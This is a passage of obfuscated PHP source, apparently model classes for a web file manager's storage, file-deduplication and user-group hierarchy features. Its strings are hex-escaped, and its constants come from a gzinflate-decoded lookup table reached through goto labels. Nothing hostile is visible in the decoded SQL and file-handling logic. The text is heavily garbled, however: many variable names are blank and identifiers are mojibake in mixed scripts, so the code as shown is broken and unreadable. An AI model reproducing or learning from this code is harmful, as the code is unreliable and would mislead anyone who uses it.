(isset($[$[$ޥ[561]]])) { continue; } $[$[$ޥ[561]]] = !0; $ = $this->parentLevelArray($[$ޥ[561]]); foreach ($ as $ => $Ñ) { if (isset($芖ϭ[$Ñ])) { continue; } if ($ == 0) { $芖ϭ[$Ñ] = $this->_listAppendPathRoot($, $); } if ($ != 0) { $ڐ[] = $Ñ; } } } unset($); $ڐ = array_unique($ڐ); if (count($ڐ) > 0) { $גњ = array($ޥ[467] => array($ޥ[468], $ڐ)); if (count($ڐ) == 1) { $ԁ = $this->sourceInfo($ڐ[0]); $ԛ = is_array($ԁ) ? array($ԁ) : !1; } else { $ԛ = $this->field($ޥ[568])->where($גњ)->select(); } if (!$ԛ) { $ԛ = array(); } foreach ($ԛ as $) { $芖ϭ[$[$ޥ[190]]] = $[$ޥ[42]]; } } $Ԟٜ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ۀ = array(); foreach ($׃ as &$) { $ޢ = $[$ޥ[561]]; $ҁ = $ޥ[12]; if (isset($ۀ[$ޢ])) { $ҁ = $ۀ[$ޢ]; } else { $ = $this->parentLevelArray($[$ޥ[561]]); foreach ($ as $ => $Ñ) { if (isset($芖ϭ[$Ñ])) { $ҁ .= $芖ϭ[$Ñ] . $ޥ[8]; } } $ۀ[$ޢ] = $ҁ; } $ҁ .= $[$ޥ[42]]; if ($[$ޥ[461]] == $ޥ[98]) { $ҁ .= $ޥ[8]; } $[$ޥ[559]] = str_replace($ޥ[569], $ޥ[8], $ҁ); if ($[$ޥ[189]] == $ޥ[221]) { $[$ޥ[42]] = trim($芖ϭ[$[$ޥ[190]]], $ޥ[8]); $[$ޥ[559]] = $[$ޥ[42]] . $ޥ[8]; } if (intval($[$ޥ[187]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($, $, $Ԟٜ); } } unset($); return $׃; } private function _listAppendPathRecycle(&$, $ّ, $ֳ) { $ܶɩ =& $_SERVER[ʯ]; if (!in_array($ֳ, $ّ) && $[$ܶɩ[190]] != $ֳ) { return; } $︭ = explode($ܶɩ[8], trim($[$ܶɩ[559]], $ܶɩ[8])); $鶘 = implode($ܶɩ[8], array_slice($︭, 2)); $[$ܶɩ[559]] = $ܶɩ[8] . LNG($ܶɩ[570]) . $ܶɩ[8] . ltrim($鶘, $ܶɩ[8]); $[$ܶɩ[561]] = $ܶɩ[571] . implode($ܶɩ[60], array_slice($ّ, 1)) . $ܶɩ[60]; if ($[$ܶɩ[190]] == $ֳ) { $[$ܶɩ[561]] = $ܶɩ[571]; $[$ܶɩ[189]] = $ܶɩ[221]; $[$ܶɩ[42]] = LNG($ܶɩ[570]); } $[$ܶɩ[572]] = $ܶɩ[573]; } protected function _listAppendPathRoot(&$, $ɝ) { $緸 =& $_SERVER[ʯ]; static $ߜ = false; $Ƒ = $緸[12]; if ($[$緸[187]] == self::TYPE_USER) { if ($[$緸[546]] == USER_ID) { $Ƒ = LNG($緸[574]); if ($ߜ === !1) { $餸С = Model($緸[575])->getInfoFull(USER_ID); $ߜ = _get($餸С, $緸[576], $緸[12]); } if ($ɝ && $ɝ[0] == $ߜ || !$ɝ && $[$緸[190]] == $ߜ) { $Ƒ = LNG($緸[577]); $[$緸[578]] = $緸[579]; } if (!$ɝ) { $[$緸[42]] = $Ƒ; } } else { $[$緸[580]] = Model($緸[554])->getInfoSimpleOuter($[$緸[546]]); $Ƒ = LNG($緸[581]) . $緸[172] . $[$緸[580]][$緸[42]] . $緸[174]; } } else { if ($[$緸[187]] == self::TYPE_GROUP) { $ = Model($緸[562])->getInfoSimple($[$緸[546]]); $Ƒ = $[$緸[42]]; } else { if ($[$緸[187]] == self::TYPE_SYSTEM) { $Ƒ = $緸[582]; } } } $Ƒ = $Ƒ ? $緸[8] . $Ƒ . $緸[8] : $緸[8]; return $Ƒ; } protected function _listAppendUser(&$ޤ) { $ =& $_SERVER[ʯ]; $֧ = array_to_keyvalue($ޤ, $[12], $[503]); $̂ = array_to_keyvalue($ޤ, $[12], $[505]); $ = array_merge($֧, $̂); $Ԁ = Model($[575])->userListInfo($); foreach ($ޤ as &$śǞ) { $ޒ = $śǞ[$[503]]; $śǞ[$[503]] = $Ԁ[$ޒ] ? $Ԁ[$ޒ] : !1; $ޒ = $śǞ[$[505]]; $śǞ[$[505]] = $Ԁ[$ޒ] ? $Ԁ[$ޒ] : !1; if (isset($śǞ[$[515]]) && $śǞ[$[515]][$[583]]) { $˒ = $GLOBALS[$[6]][$[99]][$[584]]; if ($śǞ[$[515]][$[585]] <= time() - $˒) { $this->metaSet($śǞ[$[190]], $[583], null); $this->metaSet($śǞ[$[190]], $[585], null); unset($śǞ[$[515]][$[583]]); continue; } $ = $śǞ[$[515]][$[583]]; $śǞ[$[515]][$[586]] = Model($[575])->getInfoSimpleOuter($); } } unset($śǞ); } public function parentLevelArray($) { $ʭ벊 =& $_SERVER[ʯ]; $ = explode($ʭ벊[60], trim($, $ʭ벊[60])); return array_remove_value($, $ʭ벊[221]); } public function listAll($ǯ) { $ =& $_SERVER[ʯ]; $ = $this->sourceInfo($ǯ); $ = array($[587] => array($[588], $[$[561]] . $ǯ . $[589]), $[590] => 0); $ = $[591]; $ͱ = "\x4c\105\x46\x54\40\x4a\117\111\116\x20{$this->tablePrefix}\x69\157\137\x66\151\x6c\x65\40\146\x69\154\145\40\157\x6e\x20\163\157\165\x72\143\x65\x2e\x66\151\x6c\145\111\104\40\x3d\40\x66\151\x6c\145\x2e\x66\x69\154\x65\111\104"; $ݩ = $this->alias($[495])->field($)->where($)->join($ͱ)->select(); $this->_listAppendAuth($ݩ); $this->_listAppendUser($ݩ); $this->_listAppendPath($ݩ); $ݩ = array_to_keyvalue($ݩ, $[190]); $Ԑ߻ = "\x2f{$[$[42]]}\x2f"; $Ԑ߻ = $Ԑ߻ == $[569] ? $[8] : $Ԑ߻; $ = array(); foreach ($ݩ as $ڧ => $ݚ) { $ϔ = $this->parentLevelArray($ݚ[$[561]]); array_shift($ϔ); $Ų۲ = $Ԑ߻; for ($ = 0; $ < count($ϔ); $++) { $Ų۲ .= $ݩ[$ϔ[$]][$[42]] . $[8]; } $Ų۲ .= $ݚ[$[42]]; if ($ݚ[$[461]]) { $Ų۲ .= $[8]; } $ = array($[471] => str_replace($[569], $[8], str_replace($[569], $[8], str_replace($[569], $[8], $Ų۲))), $[592] => intval($ݚ[$[461]]), $[593] => intval($ݚ[$[86]]), $[95] => intval($ݚ[$[95]]), $[97] => $this->pathInfoFilter($ݚ)); if (!$[$[461]]) { $[$[517]] = $ݚ[$[517]]; } $[] = $; } $ = array_sort_by($, $[94]); return $; } } goto FØ; Cב: define($_SERVER[ʯ][0], $_SERVER[ʯ][1]); $_SERVER[] = explode($_SERVER[ʯ][2], gzinflate(substr($_SERVER[ʯ][3], 10, -8))); function binCheckEq($, $е) { return $ == $е; } goto C僯; eֺƌ: define($_SERVER[ʯ][292], 3); define($_SERVER[ʯ][293], 1); define($_SERVER[ʯ][294], 0); goto Fֈ߾; Bﳟ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\x65" => "\x69\157\x5f\x66\151\154\x65\137\155\x65\164\141", "\x6d\145\164\x61\x46\151\x65\x6c\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($旟) { $Ӕ =& $_SERVER[ʯ]; static $ë = array(); if (!isset($ë[$旟])) { $٨ = $Ӕ[1945]; $ = Model($Ӕ[520])->field($٨)->where(array($Ӕ[518] => $旟))->find(); $ë[$旟] = $; } return $ë[$旟]; } public function addFileByContent($؂ = '', $ = '') { $쐋 =& $_SERVER[ʯ]; $ = TEMP_PATH . $쐋[1946]; if (!is_dir($)) { mk_dir($); } $؆ = $ . $쐋[1947] . rand_string(16); file_put_contents($؆, $؂); $Д = $this->addFile($؆, $, !0); if (file_exists($؆)) { @unlink($؆); } return $Д; } public function createFileName($, $ŋ = false, $ = false) { $ᥑ =& $_SERVER[ʯ]; $Ѯ = IO::init($ᥑ[8]); $ = $this->makeFilePath($, $Ѯ, $ŋ, $); $ȶʕ = $Ѯ->pathFather($); static $鞋 = false; $ = $ᥑ[1948] . md5($ȶʕ); if (!$鞋 && !Cache::get($)) { $鞋 = !0; $ = IO::mkdir($ȶʕ); if (!IO::exist($ . $ᥑ[857])) { IO::mkfile($ . $ᥑ[857]); } Cache::set($, 1, 3600 * 2); } return $; } public function makeFilePath($, $, $ = false, $ʡ = false) { $Ъ =& $_SERVER[ʯ]; $닡 = Model($Ъ[830])->get($Ъ[1949]); $ = KodIO::defaultIO() . date($Ъ[1950]); $ = $ . rand_string(5) . short_id(100); $ = str_replace($Ъ[8], $Ъ[11], KodIO::clear($)); $̾ = $->ext($); if (!$) { $닡 = $Ъ[1951]; } switch ($닡) { case $Ъ[1952]: $ = $ . $Ъ[10] . $->ext($); if ($̾ == $Ъ[1889]) { $ .= $Ъ[1267]; } break; case $Ъ[1953]: $ߘ = Model($Ъ[830])->get($Ъ[831]); $铀 = substr(md5($Ъ[832] . $ߘ . date($Ъ[808])), 0, 8); $Ր = KodIO::defaultDriver(); $ = $Ъ[1298] . $Ր[$Ъ[451]] . $Ъ[460] . date($Ъ[1954]) . $铀 . $Ъ[8]; if ($̾ == $Ъ[1889]) { $ .= $Ъ[1267]; } $ȗ = $Ъ[1955] . $ . $; CacheLock::lock($ȗ); $ = $ . $; if (IO::exist($ . $)) { $À = substr($, 0, strlen($) - strlen($̾)); $ = $ʡ ? substr($ʡ, 0, 5) : ($ ? substr($, 0, 5) : rand_string(5)); $ = $ . $À . $ . $Ъ[10] . $̾; } if (IO::isTypeObject($) && !IO::isUploadServer($)) { if (IO::exist($)) { return $; } $ = IO::setContent($, $Ъ[12]); if (!$) { show_json($Ъ[1956], !1); } } CacheLock::unlock($ȗ); break; case $Ъ[1951]: break; default: break; } return $; } public function addFileByRemote($Ͽ, $ѻȩ, $ = array()) { $ڙˌ =& $_SERVER[ʯ]; if (!IO::exist($Ͽ)) { return !1; } $̧ = $[$ڙˌ[649]] ? $[$ڙˌ[649]] : $ڙˌ[12]; $К = IO::hashMd5($Ͽ, $̧); $ = KodIO::defaultDriver(); $ = array($ڙˌ[593] => IO::size($Ͽ), $ڙˌ[1957] => 1, $ڙˌ[470] => $ѻȩ, $ڙˌ[868] => $[$ڙˌ[451]], $ڙˌ[471] => $Ͽ, $ڙˌ[1958] => $[$ڙˌ[648]] ? $[$ڙˌ[648]] : IO::hashSimple($Ͽ), $ڙˌ[1959] => $К ? $К : $̧); if ($ֲ = $this->addFileCheckExist($[$ڙˌ[648]], $[$ڙˌ[649]], $[$ڙˌ[86]])) { return $ֲ; } return $this->addFileData($); } private function addFileData($) { $ʹϳ =& $_SERVER[ʯ]; if (!$) { return !1; } $[$ʹϳ[86]] = intval($[$ʹϳ[86]]); if (!$[$ʹϳ[86]] && strlen($[$ʹϳ[648]]) > 32) { $[$ʹϳ[86]] = intval(substr($[$ʹϳ[648]], 32)); } $ = $this->add($); return $this->find($); } public function addFile($, $Фθ, $Ӗʇ = false) { $ =& $_SERVER[ʯ]; $ߨب = IO::hashSimple($); $ٟ = IO::size($); $ = $ٟ <= 1024 * 1024 * 10 ? IO::hashMd5($) : $[12]; $߰ѫ = $[1960] . $ߨب; CacheLock::lock($߰ѫ); if ($ && $ߨب) { $훮 = $this->addFileCheckExist($ߨب, $, $ٟ); if ($훮) { CacheLock::unlock($߰ѫ); return $훮; } } $ = $this->addFileMake($, $ٟ, $ߨب, $, $Фθ, $Ӗʇ); $ѫ˿ = $this->addFileData($); CacheLock::unlock($߰ѫ); if (!$ && $ѫ˿) { $this->fileMd5Check($ѫ˿); } return $ѫ˿; } private function fileMd5Check($) { $∞ =& $_SERVER[ʯ]; $¬ = array($[$∞[517]], $[$∞[94]]); $͊ = $∞[1961] . $[$∞[94]]; $ݺ = $∞[1962] . $[$∞[517]]; $ΔΠ = TaskQueue::add($∞[1963], $¬, $͊, $ݺ); if (!$ΔΠ) { $this->fileMd5Set($[$∞[517]], $[$∞[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($χ, $ڂ) { $ =& $_SERVER[ʯ]; $۾ = $this->find($χ); if (!$۾ || $۾[$[649]]) { return; } $ї = IO::hashMd5($ڂ); if (!$ї) { return $[12]; } $this->where(array($[517] => $χ))->save(array($[649] => $ї)); } public function addFileMake($, $, $򰫥, $ǒ, $׬, $) { $ӕ =& $_SERVER[ʯ]; $ϳ = $this->createFileName($׬, $򰫥, $ǒ); $څ = get_path_father($ϳ); $蘊 = get_path_this($ϳ); if ($) { $ = IO::move($, $څ, !1, $蘊); } else { $ = IO::copy($, $څ, !1, $蘊); } if (!$) { return !1; } $ = KodIO::defaultDriver(); $ = array($ӕ[593] => $, $ӕ[1957] => 1, $ӕ[470] => $׬, $ӕ[868] => $[$ӕ[451]], $ӕ[471] => $ϳ, $ӕ[1958] => $򰫥, $ӕ[1959] => $ǒ); return $; } public function addFileCheckExist($, $, $¹) { $ =& $_SERVER[ʯ]; $ = $this->findByHash($, $); if (!$) { return !1; } $ΐ = array($[1957] => intval($[$[1964]]) + 1, $[593] => $¹); $this->where(array($[518] => $[$[517]]))->save($ΐ); return $; } public function remove($Ӱ) { $this->linkCountChange($Ӱ, !1); $this->clearEmpty(); return !0; } public function linkAdd($͍Ǥ) { $this->linkCountChange($͍Ǥ, !0); } public function linkCountChange($, $ױ) { $ =& $_SERVER[ʯ]; if (!$) { return; } if (!is_array($)) { $ = array($); } $݅ʓ = array(); foreach ($ as $֦ӝ) { $ = $֦ӝ . $[12]; if (!$݅ʓ[$]) { $݅ʓ[$] = 0; } $݅ʓ[$]++; } $Ӹ = array(); foreach ($݅ʓ as $֦ӝ => $¾) { $ = $¾ . $[12]; if (!$Ӹ[$]) { $Ӹ[$] = array(); } $Ӹ[$][] = $֦ӝ; } foreach ($Ӹ as $¾ => $) { if (!$) { continue; } $¾ = $ױ ? $¾ : -intval($¾); $ = array($[517] => array($[7], $)); if ($¾ < 0) { $[$[1964]] = array($[1076], abs($¾)); } $this->where($)->setAdd($[1964], $¾); } } public function findByHash($򆸨, $ĵ = false) { $ =& $_SERVER[ʯ]; if (!$򆸨 && !$ĵ) { return !1; } $ = array($[1958] => $򆸨); if ($ĵ) { $ = array($[1959] => $ĵ); } return $this->order($[1965])->where($)->find(); } public function clearEmpty($ރ = 0) { $ֿ =& $_SERVER[ʯ]; $ = time() - 3600 * 24 * $ރ; $ = $ֿ[1966] . $; $ꌝ = $this->where($)->select(); if (!$ꌝ) { return; } $ = new Task($ֿ[1967], $ֿ[12], count($ꌝ)); foreach ($ꌝ as $ݦ) { $->update(1); $this->resetFile($ݦ); } $->end(); } public function resetFile($ח) { $υ =& $_SERVER[ʯ]; $ = array($υ[518] => $ח[$υ[517]]); $ˁˀ = Model($υ[1393])->where($)->count(); $Ûٔ = Model($υ[1968])->where($)->count(); $쨝 = intval($ˁˀ) + intval($Ûٔ); if ($쨝 == 0) { IO::remove($ח[$υ[94]]); Model($υ[1969])->delete($ח[$υ[517]]); $this->where($)->delete(); $this->metaSet($ח[$υ[517]], null, null); return; } if ($ח[$υ[1964]] != $쨝) { $this->where($)->save(array($υ[1957] => $쨝)); } } public function storageInfo($ = false) { $ծ =& $_SERVER[ʯ]; $ = $this->count() + 0.0; $Ϙ = 0; $؞ = 1; $ = 0; $ = 5000; for ($ = 0; $ < $; $ = $ + $) { $ބ = $this->limit($, $ + $)->select(); foreach ($ބ as $) { $؞ += $[$ծ[86]] * $[$ծ[1964]]; $Ϙ += $[$ծ[86]] * ($[$ծ[1964]] - 1); $ += $[$ծ[1964]]; } } $ = array($ծ[1970] => $؞, $ծ[1971] => $Ϙ, $ծ[1972] => $Ϙ / $؞, $ծ[90] => $, $ծ[1973] => $); return $; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\x67\162\157\165\160\137\155\145\164\x61", "\155\145\164\x61\x46\x69\x65\154\x64" => "\x67\162\157\165\160\111\x44"); protected function cacheFunctionAlias($ڑΙ) { $ =& $_SERVER[ʯ]; return array($[1974] => array($ڑΙ[0], $[1975]), $[1976] => array($ڑΙ[0], $[1977])); } protected function getInfo($Ԉ, $ = false) { $ޘ = $this->getInfoSimple($Ԉ); if (!$ޘ) { return !1; } if ($) { return $this->_listDataApplyItem($ޘ); } return $this->cacheFunctionGet($_SERVER[ʯ][1978], $Ԉ); } protected function getInfoSimple($겶, $ = false) { $ڝĨ =& $_SERVER[ʯ]; if ($) { $Ϋ = array($ڝĨ[1896] => intval($겶)); $ = $this->where($Ϋ)->find(); return is_array($) ? $ : array(); } return $this->cacheFunctionGet($ڝĨ[1979], $겶); } protected function groupAdd($) { $ϝ =& $_SERVER[ʯ]; if (!$[$ϝ[189]] && isset($[$ϝ[1896]]) && $[$ϝ[1896]] == 1) { if ($ߍ = $this->getInfoSimple($[$ϝ[1896]], !0)) { return $[$ϝ[1896]]; } } else { $ߍ = $this->getInfoSimple($[$ϝ[189]]); if (!$ߍ) { return !1; } } $ = $ϝ[571]; if ($ߍ[$ϝ[561]]) { $ = $ߍ[$ϝ[561]] . $ߍ[$ϝ[1896]] . $ϝ[60]; } $Ȳ = array($ϝ[470] => $this->groupNameAuto($[$ϝ[189]], $[$ϝ[42]]), $ϝ[453] => $[$ϝ[189]], $ϝ[628] => $, $ϝ[1980] => $[$ϝ[1883]], $ϝ[1981] => 0, $ϝ[1900] => 0); if (isset($[$ϝ[1920]])) { $Ȳ[$ϝ[1920]] = $[$ϝ[1920]]; } else { $ = $this->max($ϝ[1920]); if (!$) { $ = 0; } $Ȳ[$ϝ[1920]] = $ + 1; } if (!empty($[$ϝ[1896]])) { $Ȳ[$ϝ[1896]] = $[$ϝ[1896]]; } $匘 = $this->add($Ȳ); $this->setNamePinyin($匘, $Ȳ[$ϝ[42]]); if (isset($[$ϝ[1982]])) { $this->metaSet($匘, array($ϝ[1982] => $[$ϝ[1982]], $ϝ[1983] => $[$ϝ[1983]])); unset($[$ϝ[1982]]); unset($[$ϝ[1983]]); } Model($ϝ[1393])->groupRootAdd($匘); $this->_clearCache($[$ϝ[189]]); return $匘; } protected function groupEdit($, $̞ޏ) { $ =& $_SERVER[ʯ]; $ǂ = $this->getInfoSimple($); if (!$ǂ) { return !1; } if (!empty($̞ޏ[$[189]])) { $ʫ = $this->getInfoSimple($̞ޏ[$[189]]); if (!$ʫ) { return !1; } if ($ǂ[$[1896]] == $ʫ[$[1896]]) { return !1; } if ($̞ޏ[$[189]] != $ǂ[$[189]]) { if ($ʫ[$[561]] !== $ǂ[$[561]] && strpos($ʫ[$[561]], $ǂ[$[561]] . $ǂ[$[1896]] . $[60]) === 0) { return !1; } $̞ޏ[$[628]] = $ʫ[$[561]] . $̞ޏ[$[189]] . $[60]; $this->_changeChildLevel($ǂ, $ʫ); $this->_clearCache($ʫ[$[1896]]); $this->_clearCache($ǂ[$[189]]); } } if (isset($̞ޏ[$[42]])) { $this->setNamePinyin($, $̞ޏ[$[42]]); } if (isset($̞ޏ[$[1982]])) { $this->metaSet($, array($[1982] => $̞ޏ[$[1982]], $[1983] => $̞ޏ[$[1983]])); unset($̞ޏ[$[1982]]); unset($̞ޏ[$[1983]]); } $this->_clearChildrenCache($ǂ); return $this->where(array($[1984] => $))->save($̞ޏ); } private function _clearChildrenCache($) { $Լ =& $_SERVER[ʯ]; $뎓 = array($Լ[628] => array($Լ[588], $[$Լ[561]] . $[$Լ[1896]] . $Լ[589])); $߀ = $this->field($Լ[1896])->where($뎓)->select(); foreach ($߀ as $ٰ) { $this->_clearCache($ٰ[$Լ[1896]]); } } private function _clearCache($Ա) { $Ǫ =& $_SERVER[ʯ]; $this->cacheFunctionClear($Ǫ[1978], $Ա); $this->cacheFunctionClear($Ǫ[1979], $Ա); } private function _changeChildLevel($, $ը, $ଂ = false) { $څ =& $_SERVER[ʯ]; $Փ = $[$څ[561]] . $[$څ[1896]] . $څ[60]; $ = $ը[$څ[561]] . $ը[$څ[1896]] . $څ[60] . $[$څ[1896]] . $څ[60]; if ($ଂ) { $ = $ը[$څ[561]] . $ը[$څ[1896]] . $څ[60]; } $¸ò = array($څ[628] => array($څ[588], $[$څ[561]] . $[$څ[1896]] . $څ[589])); $ = array($څ[628] => array($څ[637], "\x72\x65\160\x6c\141\x63\x65\x28\160\x61\162\x65\x6e\x74\x4c\145\x76\x65\x6c\x2c\x27{$Փ}\47\x2c\x27{$}\x27\51")); $this->_clearChildrenCache($); $this->where($¸ò)->data($)->save(); } public function setNamePinyin($ѱ, $ = false) { $ߑ =& $_SERVER[ʯ]; if (!$) { $ߛ = $this->getInfoSimple($ѱ); $ = $ߛ[$ߑ[42]]; } if (!Input::check($, $ߑ[631])) { $this->metaSet($ѱ, $ߑ[514], null); $this->metaSet($ѱ, $ߑ[513], null); return; } $Ő£ = array($ߑ[514] => str_replace($ߑ[63], $ߑ[12], Pinyin::get($)), $ߑ[513] => Pinyin::get($, $ߑ[632])); $this->metaSet($ѱ, $Ő£); } protected function groupStatus($ń, $) { $ϒ =& $_SERVER[ʯ]; $ = $this->getInfoSimple($ń); if (!$) { return !1; } if ($ == $ϒ[98]) { $ = $this->parentLevelArray($[$ϒ[561]]); } else { $ = array($ϒ[628] => array($ϒ[588], $[$ϒ[561]] . $[$ϒ[1896]] . $ϒ[589])); $ = $this->where($)->field($ϒ[1896])->select(); $ = array_to_keyvalue($, $ϒ[12], $ϒ[1896]); } $[] = $[$ϒ[1896]]; $ = array(); foreach ($ as $ń) { $[] = array($ϒ[1896] => $ń, $ϒ[104] => $ϒ[810], $ϒ[426] => $); $this->_clearCache($ń); } return Model($ϒ[1985])->addAll($, array(), !0); } protected function groupRemove($, $ = false) { $ =& $_SERVER[ʯ]; $ = array($[1896] => $); $ = $this->where($)->find(); if (!$ || $[$[189]] == 0) { return !1; } if (!$) { $ = $this->getInfoSimple($[$[189]]); $this->_changeChildLevel($, $, !0); $this->where(array($[189] => $))->save(array($[189] => $[$[189]])); $this->_clearCache($[$[1896]]); } Model($[1985])->where($)->delete(); Model($[1986])->where($)->delete(); Model($[885])->groupRootRemove($); $this->_clearCache($[$[189]]); return $this->where($)->delete(); } protected function groupSort($ᗋ) { $Ӧư =& $_SERVER[ʯ]; $蘌 = array(); foreach ($ᗋ as $׊ => $ˢ˔) { $蘌[] = array($Ӧư[1896], $ˢ˔, $Ӧư[1920], $׊ + 1); } $this->saveAll($蘌); } public function listData() { $̙ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($̙[$_SERVER[ʯ][421]]); return $̙; } private function _makeOrder($ = '') { $ =& $_SERVER[ʯ]; $׶֓ = array($[1896], $[42], $[1885], $[224]); $ = array($[499] => $[500], $[501] => $[502]); $ۇ = Input::get($[506], $[7], $[1900], $׶֓); $ = Input::get($[507], $[7], $[1987], array($[1987], $[501])); $ = $[$]; $ = $ . "{$ۇ}\x20{$}\x2c\x20\147\x72\x6f\165\x70\x49\104\x20\141\163\143"; return $this->order($); } public function listChild($࿭) { $ =& $_SERVER[ʯ]; $ˏߠ = $this->where(array($[189] => $࿭))->_makeOrder()->selectPage(200); $this->_listDataApply($ˏߠ[$[421]]); return $ˏߠ; } public function listChildIds($) { $󭣯 =& $_SERVER[ʯ]; if (is_string($慷͛)) { $ = explode($󭣯[60], $); } $ֻ = $this->where(array($󭣯[1896] => array($󭣯[7], $)))->field($󭣯[1988])->select(); if (!$ֻ) { return !1; } $ = array(); foreach ($ֻ as $) { $[] = "\x73\145\154\x65\143\x74\x20\x67\x72\157\x75\160\x49\x44\x20\x66\162\157\x6d\40\x60\147\162\x6f\165\160\x60\x20\x77\150\x65\162\x65\40\160\x61\x72\x65\156\164\x4c\145\166\145\154\x20\x6c\151\x6b\145\40\47{$[$󭣯[561]]}{$[$󭣯[1896]]}\x2c\45\x27"; } $ = implode($󭣯[1989], $); $ֻ = $this->query($); if (!$ֻ) { return array(); } $ = array_to_keyvalue($ֻ, $󭣯[12], $󭣯[1896]); return array_unique($); } public function listByID($ے͵) { $ =& $_SERVER[ʯ]; if (!$ے͵) { return array(); } $ = array($[1896] => array($[7], $ے͵)); $ݲ = $this->where($)->select(); $ݲ = array_sort_keep($ݲ, $[1896], $ے͵); $this->_listDataApply($ݲ); return $ݲ; } public function listSearch($׊) { $Ѳ =& $_SERVER[ʯ]; $ = $׊[$Ѳ[1990]]; $ = isset($׊[$Ѳ[1991]]) ? $׊[$Ѳ[1991]] : !1; if (!trim($)) { return !1; } $ = str_replace($Ѳ[1992], $Ѳ[1993], $); $Čݘ = array($Ѳ[1896] => array($Ѳ[435], "{$}\45"), $Ѳ[42] => array($Ѳ[435], "\45{$}\x25"), $Ѳ[1061] => $Ѳ[1994]); if ($) { $ī = $this->getInfoSimple($); $ = $ī[$Ѳ[561]] . $ . $Ѳ[589]; $Čݘ = array($Čݘ, array($Ѳ[561] => array($Ѳ[435], $))); } $Čݘ = $this->parseWhereLike($Čݘ); $俕 = $this->_makeOrder()->where($Čݘ)->selectPage(20); $俕 = $俕 ? $俕 : array($Ѳ[421] => array(), $Ѳ[418] => array()); if (!$俕 || count($俕[$Ѳ[421]]) < 5 && Input::check($, $Ѳ[370])) { $ĸ = $this->groupChildrenAll($); $䖧 = $this->_searchFromMeta($Ѳ[513], $, 10, $ĸ); $˙ۯ = $this->_searchFromMeta($Ѳ[514], $, 10, $ĸ); $С = array_merge($䖧, $˙ۯ, $俕[$Ѳ[421]]); $俕[$Ѳ[421]] = array_unique_by_key($С, $Ѳ[1896]); $俕[$Ѳ[418]][$Ѳ[419]] = count($俕[$Ѳ[421]]); $俕[$Ѳ[418]][$Ѳ[420]] = ceil($俕[$Ѳ[418]][$Ѳ[419]] / $俕[$Ѳ[418]][$Ѳ[415]]); } $this->_listDataApply($俕[$Ѳ[421]]); return $俕; } protected function groupChildrenAll($ܰ) { $򘬲 =& $_SERVER[ʯ]; if (!$ܰ) { return !1; } if (is_string($ܰ)) { $ܰ = array($ܰ); } $ȹȵ = $ܰ; foreach ($ܰ as $) { $ = $this->getInfoSimple($); $ = array($򘬲[561] => array($򘬲[435], $[$򘬲[561]] . $ . $򘬲[589])); $߁ = $this->field($򘬲[1896])->where($)->select(); $ȹȵ = array_merge($ȹȵ, array_to_keyvalue($߁, $򘬲[12], $򘬲[1896])); } return array_unique($ȹȵ); } private function _searchFromMeta($, $, $, $ƃ) { $ =& $_SERVER[ʯ]; $ = strtolower($); $ = array($[104] => $, $[426] => array($[435], "\45{$}\x25")); $ = $this->parseWhereLike($); if ($ƃ) { $[$[1896]] = array($[7], $ƃ); } $Օ = Model($[1995])->where($)->limit($)->select(); if (!$Օ) { return array(); } $Օ = array_to_keyvalue($Օ, $[12], $[1896]); $ = $this->where(array($[1984] => array($[7], $Օ)))->select(); if (!$) { return array(); } return $; } protected function _listDataApplyItem($ނ) { $ = array($ނ); $this->_listDataApply($); return $[0]; } protected function _listDataApply(&$ܶ) { $ա =& $_SERVER[ʯ]; if (!$ܶ) { return; } $ = array_to_keyvalue($ܶ, $ա[12], $ա[1896]); $this->_listAppendChildren($ܶ); $this->_listAppendChildrenMember($ܶ); $this->_listAppendMeta($ܶ, $); $this->_listAppendParent($ܶ); $this->_listAppendSourceRoot($ܶ, $); } private function _listAppendChildren(&$ӯҷ) { $ =& $_SERVER[ʯ]; $۞ = array_to_keyvalue($ӯҷ, $[12], $[1896]); $ = array($[189] => array($[7], $۞)); $ = array($[189], $[1996] => $[541]); $ = $this->field($)->where($)->group($[189])->select(); $ā = array_to_keyvalue($, $[189], $[541]); foreach ($ӯҷ as &$ɯ) { $ = $ɯ[$[1896]]; $ɯ[$[1997]] = isset($ā[$]) ? intval($ā[$]) : !1; } unset($ɯ); } private function _listAppendChildrenMember(&$) { $Ʋ =& $_SERVER[ʯ]; $Ⱋ = array_to_keyvalue($, $Ʋ[12], $Ʋ[1896]); $隿ǐ = array($Ʋ[1896] => array($Ʋ[7], $Ⱋ)); $ = array($Ʋ[1896], $Ʋ[1996] => $Ʋ[541]); $ = Model($Ʋ[1986])->field($)->where($隿ǐ)->group($Ʋ[1896])->select(); $ӎ = array_to_keyvalue($, $Ʋ[1896], $Ʋ[541]); foreach ($ as &$) { $Ң = $[$Ʋ[1896]]; $[$Ʋ[1998]] = isset($ӎ[$Ң]) ? intval($ӎ[$Ң]) : !1; } unset($); } private function _listAppendMeta(&$, $ɨ) { $ң =& $_SERVER[ʯ]; $ז = array($ң[1896] => array($ң[7], $ɨ)); $щ͍ = Model($ң[1985])->where($ז)->select(); $щ͍ = array_to_keyvalue_group($щ͍, $ң[1896]); foreach ($щ͍ as &$뤢) { $뤢 = array_to_keyvalue($뤢, $ң[104], $ң[426]); } unset($뤢); foreach ($ as &$) { $[$ң[515]] = array(); if (isset($щ͍[$[$ң[1896]]])) { $[$ң[515]] = $щ͍[$[$ң[1896]]]; } } unset($); } protected function parentLevelArray($) { $ѱ =& $_SERVER[ʯ]; $ = explode($ѱ[60], trim($, $ѱ[60])); $ = array_remove_value($, $ѱ[221]); return $; } protected function parentInGroup($, $) { $ґ =& $_SERVER[ʯ]; $Π = $this->getInfoSimple($); if (!$Π) { return !0; } $ݨ = $this->parentLevelArray($Π[$ґ[561]]); $ݨ[] = $; foreach ($ݨ as $) { if (in_array($ . $ґ[12], $)) { return !0; } } return !1; } private function _listAppendParent(&$) { $ =& $_SERVER[ʯ]; $㺴 = array(); foreach ($ as &$ל) { $㺴[$ל[$[1896]]] = $ל[$[42]]; $ = $this->parentLevelArray($ל[$[561]]); foreach ($ as $Ԟ) { if (!isset($㺴[$Ԟ])) { $㺴[$Ԟ] = 0; } 